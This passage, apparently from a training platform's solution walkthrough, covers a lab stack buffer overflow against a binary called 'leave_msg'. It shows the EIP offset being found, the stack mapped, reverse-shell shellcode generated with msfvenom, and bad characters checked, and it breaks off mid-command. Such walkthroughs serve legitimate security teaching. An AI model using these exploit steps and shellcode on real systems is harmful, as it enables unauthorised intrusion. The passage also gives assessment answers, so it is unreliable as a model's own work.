l9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9
```

Subsequently, students need to feed the generated payload to the `leave_msg` binary through `GDB`, to find that `EIP` has been overwritten with the hex pattern `0x37714336`:

Code: shell

```shell
run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9")
```

```
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad<SNIP>
3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'")
Starting program: /home/htb-student/leave_msg $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad<SNIP>
3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9'")

Program received signal SIGSEGV, Segmentation fault.
0x37714336 in ?? ()
```

Subsequently, students need to utilize `pattern_offset.rb` to find that the number of bytes required to reach `EIP` is 2060:

Code: shell

```shell
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336
```

```
┌─[eu-academy-2]─[10.10.14.114]─[htb-ac413848@htb-ntyskvpmbs]─[~]
└──╼ [★]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37714336

[*] Exact match at offset 2060
```

Students can also verify this by overwriting `EIP` with `\x66` (i.e., the letter `f`) after filling the 2060-bytes buffer with `\x55`:

Code: shell

```shell
run $(python -c "print '\x55' * 2060 + '\x66' * 4")
```

```
(gdb) run $(python -c "print '\x55' * 2060 + '\x66' * 4")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 2060 + '\x66' * 4")

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Answer: `2060`

# Skills Assessment - Buffer Overflow

## Question 3

### "Submit the size of the stack space after overwriting the EIP as the answer. (Format: 0x00000)"

From the previous question, students know that the `EIP` is reached after the 2060-bytes buffer, thus, they can overwrite it with any character (`\x66`, i.e., the letter `f` will be used in here):

Code: shell

```shell
run $(python -c 'print "\x55" * 2060 + "\x66" * 4')
```

```
(gdb) run $(python -c "print '\x55' * 2060 + '\x66' * 4")
Starting program: /home/htb-student/leave_msg $(python -c "print '\x55' * 2060 + '\x66' * 4")

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Subsequently, students need to use the command `info proc mappings` to view the [memory address space ranges accessible in this process](https://sourceware.org/gdb/onlinedocs/gdb/Process-Information.html) to find out that the size of the stack is `0x22000`:

Code: shell

```shell
info proc mappings
```

```
(gdb) info proc mappings 
process 2496
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
	0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
	0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
	0x56558000 0x56579000    0x21000        0x0 [heap]
	0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
	0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
	0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
	0xf7fc3000 0xf7fc6000     0x3000        0x0 
	0xf7fcf000 0xf7fd1000     0x2000        0x0 
	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
	0xfffdc000 0xffffe000    0x22000        0x0 [stack]
```

Answer: `0x22000`

# Skills Assessment - Buffer Overflow

## Question 4

### "Read the file "/root/flag.txt" and submit the content as the answer."

First, students need to determine the length of the reverse shell shellcode. Using the same SSH connection established previously, students first need to identify the architecture of the machine using `uname` with the `-a` option, finding that it is a `Linux x86` machine:

Code: shell

```shell
uname -a
```

```
htb-student@nixbof32skills:~$ uname -a

Linux nixbof32skills 4.15.0-124-generic #127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Subsequently, students need to generate a reverse shell shellcode using `msfvenom`, to find out that it is `68` bytes:

Code: shell

```shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 --platform linux --arch x86 --format c
```

```
┌─[us-academy-1]─[10.10.14.134]─[htb-ac413848@htb-qc5sis1b2a]─[~]
└──╼ [★]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 --platform linux --arch x86 --format c

No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
"\x02\x00\x23\x29\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Although the payload is `68` bytes, as a precaution, students need to take a larger range in case the shellcode grows in size later on. Also, students need to insert `No Operation` (`NOP`) instructions before the beginning of the shellcode. Thus, students now know that 2064 bytes are needed to reach `EIP`, and, adding `NOP` instructions before the shellcode will result in a total size of `150` bytes:

Code: python

```python
Buffer = "\x55" * (2064 - 100 - 150 - 4) # = 1810
NOPs = "\x90" * 100
Shellcode = "\x44" * 150
EIP = "\x66" * 4
```

The Python command that will be run within `gdb` can be constructed as:

Code: python

```python
python -c 'print "\x55" * (2064 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4'
```

On the spawned target, students can test the payload and see if `leave_msg` will have the `EIP` get filled with four `x66` characters:

Code: shell

```shell
gdb -q leave_msg
run $(python -c  'print "\x55" * (2064 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
```

```
htb-student@nixbof32skills:~$ gdb -q leave_msg

Reading symbols from leave_msg...(no debugging symbols found)...done.
(gdb) run $(python -c  'print "\x55" * (2064 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Starting program: /home/htb-student/leave_msg $(python -c  'print "\x55" * (2064 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Students will notice that the `EIP` has been filled with four `x66` characters. Subsequently, students need to identify bad characters that need to be avoided in shellcode and the return address to be picked afterward. To identify bad characters, students need to have all 256 characters (thus, 256 bytes) and calculate the size of the buffer again:

Code: python

```python
Buffer = "\x55" * (2064 - 256 - 4) # = 1804
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
EIP = "\x66" * 4
```

The Python command that will be run within `gdb` can be constructed as:

Code: python

```python
python -c 'print "\x55" * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4'
```

Students then need to debug `leave_msg` and set a breakpoint at the function corresponding to `leave_msg`, to determine its name, students need to disassemble the `main` function:

Code: shell

```shell
gdb -q leave_msg
set disassembly-flavor intel
disas main
```

```
htb-student@nixbof32skills:~$ gdb -q leave_msg

Reading symbols from leave_msg...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x0000073b <+0>:	lea    ecx,[esp+0x4]
   <SNIP>
   0x00000778 <+61>:	call   0x68d <leavemsg>
<SNIP>
```

The function name is `leavemsg`, therefore, students need to set a breakpoint at it:

Code: shell

```shell
break leavemsg
```

```
(gdb) break leavemsg

Breakpoint 1 at 0x691
```

Subsequently, students need to run the Python command:

Code: python

```python
run $(python -c 'print "\x55" * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
```

```
(gdb) run $(python -c 'print "\x55" * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/htb-student/leave_msg $(python -c 'print "\x55" * (2064 - 256 - 4) + "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555691 in leavemsg ()
```

Then, students need to examine the stack, to find the characters start with `0x01` instead of `0x00` (since the `null byte` was ignored) and that after `0x08`, `0x09` is missing and the input afterward got truncated:

Code: shell

```shell
x/2000xb $esp+2390
```

```
(gdb) x/2000xb $esp+2390

0xffffd5da:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5e2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ea:	0x55	0x55	0x55	0x55	0x55	0x55	0x01	0x02
0xffffd5f2:	0x03	0x04	0x05	0x06	0x07	0x08	0x00	0x0b
0xffffd5fa:	0x0c	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13
0xffffd602:	0x14	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b
0xffffd60a:	0x1c	0x1d	0x1e	0x1f	0x00	0x21	0x22	0x23
```

Therefore, `0x00` and `0x09` are two bad characters that must be excluded from the shellcode and the return address. Now, students need to preform the previous steps again to check for other bad characters. Students need to have all 254 characters (thus, 254 bytes) and calculate the size of the buffer, this time excluding `x00` and `x09`:

Code: python

```python
Buffer = "\x55" * (2064 - 254 - 4) # = 1806
CHARS="\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
EIP = "\x66" * 4
```

The Python command that will be run within `gdb` can be constructed as:

Code: python

```python
python -c 'print "\x55" * (2064 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" + "\x66" * 4'
```

Students then need to debug `leave_msg` and set a breakpoint at the function `leavemsg`:

Code: shell

```shell
gdb -q leave_msg
set disassembly-flavor intel
break leavemsg
```

```
htb-student@nixbof32skills:~$ gdb -q leave_msg

Reading symbols from leave_msg...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break leavemsg
Breakpoint 1 at 0x691
```

Subsequently, students need to run the Python command:

Code: python

```python
run $(python -c 'print "\x55" * (2064 - 254 - 4) + 